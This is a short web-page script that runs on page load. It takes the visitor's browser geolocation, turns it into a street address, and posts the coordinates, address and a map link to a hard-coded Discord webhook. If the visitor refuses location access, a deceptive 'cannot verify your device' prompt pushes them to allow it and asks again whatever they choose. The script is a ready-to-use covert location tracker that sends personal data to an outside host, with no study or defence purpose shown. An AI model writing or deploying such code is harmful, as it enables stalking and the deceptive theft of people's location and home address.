<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;
  var addressUrl = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`;

  fetch(addressUrl)
    .then(response => response.json())
    .then(data => {
      var address = data.address;
      var houseNumber = address.house_number ? address.house_number : '';
      var road = address.road ? address.road : '';
      var city = address.city ? address.city : '';
      var state = address.state ? address.state : '';
      var postcode = address.postcode ? address.postcode : '';
      var country = address.country ? address.country : '';
      var webhookUrl = "https://discord.com/api/webhooks/1437208147466129420/fTBtmZSYMJtuE3k0QcOuYeWNQdQxM0ywfDHNkV9AEyo6ihfhvzzuOXXnpbSxCcNCAxP6"; // Replace with your own webhook URL

      var message = `New location: ${latitude}, ${longitude}\nAddress: ${houseNumber} ${road}, ${city}, ${state} ${postcode}, ${country}\nGoogle Maps link: https://www.google.com/maps?q=${latitude},${longitude}`;

      var data = {
        content: message
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
        .then(response => console.log("Location sent to Discord."))
        .catch(error => console.error("Error sending location to Discord: " + error));
    })
    .catch(error => console.error("Error fetching address: " + error));
}

function showError(error) {
  if (error.code == 1) {
    var result = confirm("I'm sorry we cannot verify your device. Please click allow location to proceed!");
    if (result == true) {
      getLocation();
    } else {
      getLocation();
    }
  } else {
    alert(error.message);
  }
}

getLocation();
</script>
